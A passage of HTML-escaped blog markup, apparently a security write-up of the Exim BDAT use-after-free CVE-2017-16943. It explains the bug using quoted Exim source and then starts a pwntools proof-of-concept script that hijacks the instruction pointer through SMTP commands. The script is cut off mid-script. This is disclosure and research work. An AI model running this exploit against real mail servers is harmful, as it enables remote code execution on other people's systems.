&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* header_size += 256; */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;store_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newtext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It seems normal if the store functions are just like realloc, malloc and free. However, they are different and cannot be used in this way. When exim tries to &lt;strong&gt;extend&lt;/strong&gt; store, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; checks whether the old store is the latest store allocated in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;. It returns False immediately if the check is failed.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/store.c#L276&quot;&gt;store.c: 276 store_extend&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; fails, exim tries to get a new store and release the old one. After we look into  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; and store_release, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; returns a &lt;strong&gt;store&lt;/strong&gt;, but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release&lt;/code&gt; releases a &lt;strong&gt;block&lt;/strong&gt; if the store is at the head of it. That is to say, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; points to the start the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; cuts store inside it for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newtext&lt;/code&gt;, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release(next-&amp;gt;text)&lt;/code&gt; frees &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, which is equal to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, and leaves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newtext&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; reachable and finally leads to an RCE.
Exim uses &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136&quot;&gt;function pointers&lt;/a&gt; to switch between different input sources, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getbuf&lt;/code&gt;. When receiving BDAT data, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt; in order to check left chunking data size and to handle following command of BDAT. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt;, exim also uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;. It loops to read data, and stores data into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, extends if insufficient.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(;;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receive_getc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GETC_BUFFER_UNLIMITED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
  &lt;span class=&quot;cm&quot;&gt;/* If we hit EOF on a SMTP connection, it&apos;s an error, since incoming
  SMTP must have a correct &quot;.&quot; terminator. */&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EOF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* &amp;amp;&amp;amp; !smtp_batched_input */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_lost_connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; (header)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TIDYUP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;cm&quot;&gt;/* Skip to end of function */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. 
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BDAT_CMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sscanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_cmd_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%u %n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_datasize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_protocol_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;missing size for BDAT command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In exim, it usually calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;synprot_error&lt;/code&gt; to raise error message, which also logs at the same time.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOG_MAIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SMTP %s error in &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; %s %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;syntax&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;protocol&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;string_printing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_cmd_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_and_ident&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;\n&apos;-&amp;gt;&apos;\\n&apos;&lt;/code&gt;. Therefore, it asks &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; for memory to store strings.
This store makes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if (!store_extend(next-&amp;gt;text, oldsize, header_size))&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; failed when next extension occurs and then triggers use-after-free.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;The following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when &lt;strong&gt;dkim&lt;/strong&gt; is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;127.0.0.1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1250&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;BDAT 1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
